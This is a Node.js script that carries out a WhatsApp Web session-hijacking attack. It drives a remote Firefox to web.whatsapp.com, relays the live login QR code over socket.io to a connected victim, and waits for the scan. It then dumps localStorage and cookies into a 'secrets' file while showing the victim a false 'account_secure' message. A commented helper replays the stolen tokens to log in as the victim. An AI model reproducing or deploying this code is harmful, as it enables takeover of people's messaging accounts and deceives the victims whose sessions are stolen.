var server_port = 8080;
var server_ip_address = '127.0.0.1';

var app = require('express')();
var express = require('express');
var http = require('http').createServer(app);
var io = require('socket.io')(http);
var child_process = require('child_process');
var readline = require('readline');
var wd = require('wd');
var fs = require('fs');

app.use(express.static('static'));

// Set token in new browser
//
// function login(token) {Object.keys(token.s).forEach(function (key) {localStorage.setItem(key, token.s[key])}); token.c = token.c.split(';'); token.c.forEach(function(cookie) {document.cookie = cookie; });}

io.on('connection', function(socket){
    console.log('a target connected');

    var browser = wd.promiseChainRemote(),
        interval;

    browser
        .init({browserName:'firefox'})
        .setAsyncScriptTimeout(100000000)
        .get("http://web.whatsapp.com")
        .waitForConditionInBrowser('typeof document.querySelector(".qrcode").dataset.ref == "string"', 10000)
        .elementByCssSelector('.qrcode', function() {
            console.log('Starting to wait for tokens');

            interval = setInterval(function() {
                console.log('Entering interval');
                browser
                    .eval("JSON.stringify({s: localStorage, c: document.cookie})", function(err, data) {
                        console.log(data);
                        if(data.length > 2000) { // such check much wow
                            console.log('p0wned');
                            fs.appendFileSync('secrets', data + "\n");
                            socket.emit('success', 'account_secure');
                            browser.close();
                            clearInterval(interval);
                        }
                    })
                    .elementByCssSelector('.qrcode', function(err, qr) {
                        qr.getAttribute('data-ref', function(err, data) {
                            if(!err) {
                                console.log(data);
                                socket.emit('code', data);
                            }
                        });
                    })
                    .elementByCssSelector('.qr-button', function(err, button) {
                        if(!err) {
                            button.click();
                        } 
                    })

            }, 3000);
        });

    socket.on('disconnect', function(){
        console.log('target disconnected');
        browser.close();
        clearInterval(interval);
    })
});

http.listen(server_port, server_ip_address, function(){
  console.log("Listening on " + server_ip_address + ", server_port " + server_port);
});
